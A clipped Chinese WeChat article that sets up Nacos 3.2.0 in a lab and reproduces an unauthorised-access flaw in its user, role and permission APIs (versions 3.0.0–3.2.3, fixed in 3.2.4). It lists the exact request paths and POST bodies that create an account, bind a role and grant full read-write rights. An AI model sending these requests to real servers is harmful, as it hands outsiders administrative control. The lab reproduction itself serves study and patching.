---
title: 【微信】记一次nacos3.x的搭建和漏洞复现过程(超详细)
source: https://mp.weixin.qq.com/s/FJHz17SXsNxyCctSu24ylQ
source_host: mp.weixin.qq.com
clip_date: 2026-11-15T09:53:37+08:00
trace_id: 6e66ab67-04a6-4b8e-b898-2885036d7550
content_hash: b3ab2a5f97e6a1bc09fb4283f089d2a9b4145f931726b48439182c535f23ca9d
status: synced
tags:
  - 微信
  - 漏洞分析
  - Linux安全
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: Nacos 3.x（3.0.0~3.2.3）存在用户/角色/权限管理接口未授权访问漏洞 QVD-2026-59388，可未授权创建用户并提权，3.2.4 已修复。
ai_summary_style: key-points
images_status:
  total: 17
  succeeded: 17
  failed_urls: []
notion_page_id: 41975244-d011-8159-8a8d-fc2666f2538e
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Nacos 3.x（3.0.0~3.2.3）存在用户/角色/权限管理接口未授权访问漏洞 QVD-2026-59388，可未授权创建用户并提权，3.2.4 已修复。
> 
> - **漏洞原理：** Nacos 3.x 将接口鉴权划分为多个作用域，但用户、角色、权限管理接口未归入 `ADMIN_API` 作用域，即使开启 Admin/Console 鉴权仍可被未授权访问。
> - **影响与修复：** 影响 Nacos 3.0.0 ~ 3.2.3，修复版本为 3.2.4。
> - **复现步骤：** 依次调用 `/nacos/v3/auth/user/list` 读用户列表 → POST `/v3/auth/user` 创建 test 用户 → POST `/v3/auth/role` 创建角色并绑定 → POST `/v3/auth/permission`（resource=`*`，action=rw）授予读写权限，之后新建用户即可正常登录并获得读写权限；而 `/v3/admin/cs/config/list` 返回 403 说明该接口鉴权正常。
> - **搭建环境：** CentOS7 + JDK17（Temurin 源安装），下载 nacos-server-3.2.0 源码解压，给 bin 目录加执行权限，`openssl rand -base64 48` 生成 token 密钥写入 application.properties，`startup.sh -m standalone` 单机启动；3.0 起控制台端口为 8080，服务端口仍为 8848。

**淋烟雨漫江南** *2026年11月11日 15:46*

这篇文章主要是记录搭建nacos和复现QVD-2026-59388最新权限绕过漏洞的过程

本次靶机采用Centos7+JDK17版本搭建

Cnetos7安装JDK17

```bash
sudo cat <<EOF > /etc/yum.repos.d/adoptium.repo
[Adoptium]
name=Adoptium
baseurl=https://packages.adoptium.net/artifactory/rpm/centos/7/x86_64
enabled=1
gpgcheck=1
gpgkey=https://packages.adoptium.net/artifactory/api/gpg/key/public
EOF
```

```ruby
sudo rpm --import https://packages.adoptium.net/artifactory/api/gpg/key/public
```

```bash
sudo yum clean all
sudo yum makecache
sudo yum install temurin-17-jdk -y
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/46c5f9eaa221ed65.png)

在github上下载源码 这里用的是3.2.0版本

```apache
https://github.com/alibaba/nacos/releases/tag/3.2.0
```

下载完成之后使用tar进行解压

```apache
tar -zxvf nacos-server-3.2.0.tar.gz
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/25fc03e971d2460d.png)

关于nacos的目录结构

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/06ae729559b46959.png)

```python
nacos/
├── bin/          # 启动脚本
├── conf/         # 配置文件
├── target/       # 运行 jar
├── logs/         # 日志
├── plugins/      # 插件
└── data/         # 数据
```

## 部署与启动

进入/nacos/bin目录

```bash
cd /nacos/bin
chmod +x ./*
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a7623ce12d5d0260.png)

需要保证bin目录下文件拥有可执行权限

在Nacos 3.x 默认开启控制台鉴权，启动时会要求配置三个参数

```javascript
vim conf/application.properties //修改配置文件
```

nacos.core.auth.enabled=falsenacos.core.auth.plugin.nacos.token.secret.key=Base64密钥nacos.core.auth.server.identity.key=identityKeynacos.core.auth.server.identity.value=identityValue

默认为false不用修改

```apache
openssl rand -base64 48 //随机生成48位编码
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/878999596e467bfa.png)

注释的为官方自带的key懒得配置的师傅也可以使用默认的

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/6dc10f0b4f567f1e.png)

定义 Key/Value(可以不配置)

启动nacos

```bash
cd ./bin
bash startup.sh -m standalone //如果报错的话换sh
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/32862f501031c0f7.png)

启动完成之后查看日志是否启动成功

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/bf5e28522e23382b.png)

启动成功之后在查看端口号是否开发

在3.0之后控制台改为8080端口了所以只需要访问8080端口即可

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/7785e77a14304967.png)

配置密码之后登录即可

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/21cfc9cadaffbf43.png)

具体复现过程如下

## 漏洞描述与复现

漏洞描述

Nacos 3.x 把接口鉴权分成了多个作用域，但用户、角色、权限相关的管理接口没有正确归入 `ADMIN_API` 作用域，导致即使开启了 Admin/Console 鉴权，这些接口仍可能被未授权访问。

影响版本：Nacos 3.0.0 ~ 3.2.3

修复版本：Nacos 3.2.4

一、未授权访问

```apache
http://192.168.80.166:8848/nacos/v3/admin/cs/config/list?pageNo=1&pageSize=1
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0e3f1612a5b2fd09.png)

返回403说明接口存在鉴权

二、未授权读取用户列表

```apache
http://192.168.80.166:8848/nacos/v3/auth/user/list?pageNo=1&pageSize=10
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/b79000e641cfa4f7.png)

三、未授权创建用户

```bash
http://192.168.80.166:8848/nacos/v3/auth/user //get
username=test&password=test //post
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0398b98305bc68ed.png)

直接登录nacos会提示没有权限

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c97ca6de07682530.png)

四、未授权创建角色并绑定用户

```bash
http://192.168.80.166:8848/nacos/v3/auth/role //get
cole=test&username=test //post
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/2cf5405c38949bff.png)

五、未授权添加读写权限

```bash
http://192.168.80.166:8848/nacos/v3/auth/permission //get
role=test&resource=*&action=rw //post
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/67609fa9157db289.png)

重新登录nacos拥有读写权限

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a39fdcfd607eabdd.png)

结束。

收录于Nday复现

作者提示: 个人观点，仅供参考
